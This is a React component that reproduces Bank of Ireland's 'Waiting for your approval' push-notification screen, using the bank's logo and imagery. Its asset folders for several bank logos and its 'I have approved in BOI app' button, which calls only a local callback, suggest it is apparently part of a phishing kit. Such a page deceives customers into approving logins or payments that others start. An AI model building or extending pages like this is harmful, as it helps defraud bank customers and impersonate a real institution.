"use client";

import React from "react";

type BoiApprovalCardProps = {
  saving?: boolean;
  onConfirm: () => void;
};

export function BoiApprovalCard({ saving = false, onConfirm }: BoiApprovalCardProps) {
  return (
    <div
      className="relative flex min-h-screen w-full flex-col items-center justify-center p-4 sm:p-6 md:p-8 bg-cover bg-center bg-no-repeat"
      style={{ backgroundImage: "url('/bank-assets/boi-bg.jpg')" }}
    >
      {/* Dark overlay fallback to ensure contrast */}
      <div className="absolute inset-0 bg-black/10 pointer-events-none" />

      {/* Bank of Ireland Logo at top center */}
      <div className="relative z-10 mb-6 sm:mb-8 flex justify-center">
        <img
          src="/bank-logos/boi_logo.svg"
          alt="Bank of Ireland"
          className="h-8 sm:h-9 md:h-10 w-auto drop-shadow-md"
        />
      </div>

      {/* Main Approval Card */}
      <div className="relative z-10 w-full max-w-[880px] rounded-[16px] bg-white p-6 sm:p-10 md:p-12 shadow-[0_20px_60px_rgba(0,0,0,0.35)] transition-all">
        {/* Title */}
        <h1 className="text-center font-light text-[24px] sm:text-[32px] md:text-[34px] text-[#4a5568] tracking-tight">
          Waiting for your approval
        </h1>

        {/* Subtitle - Device name omitted as requested */}
        <p className="mt-2.5 sm:mt-3 text-center text-[15px] sm:text-[17px] font-semibold text-[#1a202c]">
          We've sent a notification to your security device.
        </p>

        {/* Card Content Body */}
        <div className="mt-8 sm:mt-10 flex flex-col md:flex-row items-center md:items-center justify-center gap-8 md:gap-12 lg:gap-14">
          {/* Left Column: Phone mockup with notification banner */}
          <div
            onClick={onConfirm}
            title="Tap to approve"
            className="group shrink-0 cursor-pointer flex flex-col items-center transition-transform hover:scale-[1.02]"
          >
            <img
              src="/bank-assets/boi-phone.png"
              alt="Security Device Notification"
              className="w-[140px] sm:w-[160px] md:w-[170px] h-auto object-contain select-none"
            />
          </div>

          {/* Right Column: Instructions, Notice Box & Status */}
          <div className="flex-1 max-w-[480px] w-full flex flex-col text-left space-y-5">
            {/* Top instruction text */}
            <p className="text-[14px] sm:text-[16px] text-[#4a5568] leading-relaxed">
              To continue, swipe to approve the notification on your security device.
            </p>

            {/* Info callout box */}
            <div className="rounded-lg bg-[#f8f9fa] border border-[#eaedf1] p-4 sm:p-5 flex items-start gap-3.5">
              <div className="mt-0.5 flex h-5 w-5 shrink-0 items-center justify-center rounded-full bg-[#0066b2] text-[12px] font-bold text-white italic select-none">
                i
              </div>
              <p className="text-[13px] sm:text-[14px] text-[#4a5568] leading-relaxed">
                Didn't get a notification? Open the Bank of Ireland app on your security device, tap{" "}
                <strong className="font-bold text-[#1a202c]">Waiting for your approval</strong> then swipe to
                approve the notification.
              </p>
            </div>

            {/* Status & Action */}
            <div className="pt-2 flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
              <div className="flex items-center gap-2 text-[15px] sm:text-[16px] font-semibold text-[#1a202c]">
                <span>Waiting for approval</span>
                <span className="inline-flex gap-1 items-center">
                  <span
                    className="inline-block h-1.5 w-1.5 rounded-full bg-[#0066b2] animate-bounce"
                    style={{ animationDelay: "0ms" }}
                  />
                  <span
                    className="inline-block h-1.5 w-1.5 rounded-full bg-[#0066b2] animate-bounce"
                    style={{ animationDelay: "150ms" }}
                  />
                  <span
                    className="inline-block h-1.5 w-1.5 rounded-full bg-[#0066b2] animate-bounce"
                    style={{ animationDelay: "300ms" }}
                  />
                </span>
              </div>

              <button
                type="button"
                onClick={onConfirm}
                disabled={saving}
                className="inline-flex items-center justify-center rounded-lg bg-[#0066b2] px-5 py-2.5 text-[14px] font-semibold text-white shadow-sm transition-all hover:bg-[#004e8a] active:scale-[0.98] disabled:opacity-60 disabled:cursor-not-allowed"
              >
                {saving ? "Confirming..." : "I have approved in BOI app"}
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
